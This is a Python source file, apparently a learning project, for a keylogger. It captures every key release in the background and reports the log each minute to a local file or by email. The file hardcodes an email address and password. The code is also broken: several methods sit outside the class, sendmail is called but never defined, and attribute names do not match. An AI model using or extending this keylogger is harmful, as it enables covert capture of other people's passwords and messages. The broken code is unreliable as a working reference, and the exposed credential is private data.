'''
Key logger project to work on python programming / security priciples:

Goal: 
 - Listen to keystrokes in the background.
 - Whenever a key is pressed and released, we add it to a global string variable.
 - Every N minutes, report the content of this string variable either to a local file (to upload to FTP server or use Google Drive API) or via email.
'''

#imports for full script
import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (NOT Gmail)

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

#Initialize parameters
send_every_report = 60      #60, in second == 1 minute
email_address = 'wave4rider@yahoo.com'
email_password = 'LGA774722djm!'


class Keylogger:
    def __init__(self, interval, report_method='email'):
        #pass send_every_report to interval
        self.interval = interval
        self.report_method = report_method

        #this will log all keystrokes within self.interval
        self.log = ''

        #record start & end datetimes
        self.startdt = datetime.now()
        self.end_dt = datetime.now()


#Use Keyboards on_release() function -- takes callback "KEY_UP" when key on keyboard released
def callback (self, event):
    name = event.name
    if len(name) > 1:
        if name == 'space':
            # creates a space instead of the word 'space'
            name = ' '
        elif name == 'enter':
            #add new line when space is pressed
            name = '[ENTER]\n'
        elif name == 'decimal':
            name = '.' 
        else: 
            name = name.replace (' ', '_')
            name = f'[{name.upper()}]'
    #Last: add key name to global 'self.log' variable
    self.log += name


# Local File Reporting Block
def update_filename(self):
    start_dt_str = str(self.start_dt)[:-7].replace(" ","-").replace(":","")
    end_dt_str = str(self.end_dt)[:-7].replace(" ","-").replace(":","")
    self.filename = f'keylog - {start_dt_str}_{end_dt_str}'

def report_to_file(self):
    #opens or creates files in write mode
    with open(f'{self.filename}.txt', 'w') as f:
        #writes keylogs to the file
        print(self.log, file=f)
    print(f'[+] Saved {self.filename}.txt')

 def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(email_address, email_password, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()
        
def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=send_every_report, report_method="file")
    keylogger.start()